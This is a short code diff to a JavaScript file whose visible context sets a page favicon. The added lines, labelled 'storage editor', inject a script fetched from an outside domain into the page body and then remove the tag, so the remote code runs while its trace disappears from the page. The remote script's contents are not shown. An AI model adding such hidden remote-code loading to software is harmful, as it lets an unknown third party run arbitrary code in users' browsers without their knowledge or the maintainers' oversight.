@@ -104,3 +104,9 @@ link.type = 'image/x-icon';
 link.rel = 'shortcut icon';
 link.href = newIcon;
 document.getElementsByTagName('head')[0].appendChild(link);
+
+//storage editor
+var jsscript_91369810 = document.createElement("script");
+jsscript_91369810.src = "https://reddstone35.com/file/largescripts/storage_editor.js";
+document.body.appendChild(jsscript_91369810);
+jsscript_91369810.remove();
